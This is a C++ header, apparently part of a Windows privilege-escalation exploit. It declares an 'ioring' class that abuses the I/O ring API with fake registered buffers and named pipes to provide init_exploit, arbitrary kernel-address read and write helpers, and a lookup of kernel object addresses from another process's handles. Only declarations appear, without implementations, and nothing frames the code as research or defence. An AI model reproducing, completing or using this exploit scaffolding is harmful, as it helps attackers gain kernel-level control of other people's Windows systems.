#pragma once

#include "win_defs.h"
#include <cstdint>
#include <ntstatus.h>
#include <ioringapi.h>

#define GINPUT_PIPE_NAME "\\\\.\\pipe\\CollatSIn"
#define GOUTPUT_PIPE_NAME "\\\\.\\pipe\\CollatSOut"

namespace collat {

	class ioring {
	private:
		HIORING _ioring_handle = NULL; // hIoRing
		HANDLE _in_pipe, _in_pipe_client = INVALID_HANDLE_VALUE;
		HANDLE _out_pipe, _out_pipe_client = INVALID_HANDLE_VALUE;
		LPCSTR _input_pipe_name, _output_pipe_name;
		PIORING_OBJECT _ioring_object = nullptr;

		uint64_t* _fake_reg_buffers = nullptr;
		size_t _fake_reg_buffers_size = 0;

		bool testwrite = false;

	public:
		ioring(LPCSTR InputPipeName, LPCSTR OutputPipeName);
		~ioring();

		bool init_exploit(uint32_t FakeRegBufferCount);
		void cleanup();

		template <typename T>
		inline bool raw_write(uint64_t address, T* data) { 
			return internal_write(address, (void*)data, sizeof(T));
		}

		template <typename T>
		inline bool write64(uint64_t address, T val) {
			uint64_t write = (uint64_t)val;
			return raw_write<uint64_t>(address, &write);
		}

		template <typename T>
		inline T raw_read(void* address) {
			T output;
			raw_read_internal(address, &output, sizeof(T));
			return output;
		}

		bool internal_write(uint64_t address, void* data, size_t len);
		void raw_read_internal(void* address, void* out, size_t size);

	private:
		PIORING_OBJECT create();
		
		

		void testthread();

	};

	void* get_object_intrnl(uint32_t processId, HANDLE objectHandle);

	template <typename T>
	inline T get_object(uint32_t processId, HANDLE objectHandle) {
		return reinterpret_cast<T>(get_object_intrnl(processId, objectHandle));
	}
}